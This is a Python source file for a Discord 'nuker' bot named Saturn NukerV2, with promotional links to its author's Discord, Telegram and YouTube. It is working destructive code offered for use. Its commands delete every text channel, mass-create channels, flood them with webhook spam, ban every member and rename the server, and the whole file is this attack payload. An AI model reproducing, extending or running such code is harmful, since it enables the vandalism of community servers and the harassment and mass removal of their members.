# main.py
# made by .aydenn.
# https://www.youtube.com/@Saturnontop.
# https://t.me/SaturnSecurity
# https://discord.gg/HhGEXAmP
# saturnbotofficial@gmail.com


# IF SOMEONE SOLD YOU THIS YOU'VE BEEN SCAMMED!

# Below is the code, Do not mess with it if you don't know what your doing

# ========================================================

import os
import config

try:
    import discord, asyncio
    from discord.ext import commands
except:
    os.system("pip install discord asyncio")

print("\033[38;2;255;0;0m" + r"""
███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
         ░    ░     ░  ░      ░  ░   ░   

                                                          Made by .aydenn. | https://discord.gg/X2YK5FVx
""" + "\033[38;2;1;0;0m")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config.prefix, intents=intents)
bot.remove_command('help')

@bot.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        await handle_channel_creation(channel)

@bot.command()
async def end(ctx):
    async def nuke(channel):
        try:
            await channel.delete()
        except:
            pass

    # Delete existing channels
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await nuke(channel)

    # Create new channels
    for i in range(50):
        try:
            await ctx.guild.create_text_channel(name=config.channel_names)
        except:
            pass

    # Spam messages in the new channels
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await handle_channel_creation(channel)

async def handle_channel_creation(channel):
    try:
        webhook = await channel.create_webhook(name="Saturn | Nuker")
        for i in range(50):
            await webhook.send(config.spam_msg)
    except:
        pass


@bot.command()
async def banall(ctx):
    tasks = []
    async def mass(member):
        try:
            await member.ban()
        except:
            pass

    for member in ctx.guild.members:
        task = asyncio.ensure_future(mass(member))
        tasks.append(task)



@bot.command()
async def spam(ctx):
    spam_message = "Saturn NukerV2 | https://discord.gg/HhGEXAmP | .aydenn."

    for _ in range(25):
        await ctx.send(spam_message)


@bot.command()
async def rs(ctx):
    new_server_name = "Saturn Nukerv2 | made by .aydenn."

    try:
        await ctx.guild.edit(name=new_server_name)
        await ctx.send(f"Server name changed to: {new_server_name}")
    except discord.Forbidden:
        await ctx.send("I don't have the necessary permissions to rename the server.")


@bot.command()
async def masschannel(ctx):
    channel_name_prefix = "join-saturn"

    try:
        for i in range(1, 51):
            channel_name = f"{channel_name_prefix}-{i}"
            await ctx.guild.create_text_channel(name=channel_name)

        await ctx.send("50 channels created successfully.")
    except discord.Forbidden:
        await ctx.send("I don't have the necessary permissions to create channels.")



@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="Saturn NukerV2"))





@bot.command()
async def help(ctx):
    prefix = config.prefix

    embed_data = {
        "title": f"{bot.user.name} | Commands",
        "description": f"{prefix}end\n{prefix}banall - bans all members\n{prefix}spam - Spam, spams a channel\n{prefix}rs - Renames the server\n{prefix}masschannel - creates 50 channels\n\n\n\nJoin the discord - https://discord.gg/HhGEXAmP",
        "color": 16711680,
        "author": {"name": "Saturn NukerV2"},
        "footer": {
            "text": "Made by .aydenn. | Saturn NukerV2 | https://discord.gg/HhGEXAmP",
            "icon_url": "https://media.discordapp.net/attachments/1159869448065405009/1160270259094306878/logo__3_-removebg-preview_1.png?ex=65340ce2&is=652197e2&hm=04443a1d9db107d828d46a82ee1b8c17b976152eef3c55124f47f6d5a0b53189&=&width=337&height=337",
        },
    }

    # Send the help message as a DM if used in a server
    if isinstance(ctx.channel, discord.TextChannel):
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass  # Ignore if the bot doesn't have the manage messages permission

        await ctx.author.send(embed=discord.Embed.from_dict(embed_data))
        await ctx.send("I have sent you a dm with the list of commands.")

    # Send the help message directly in DM if used in DM
    elif isinstance(ctx.channel, discord.DMChannel):
        await ctx.send(embed=discord.Embed.from_dict(embed_data))





bot.run(config.token)
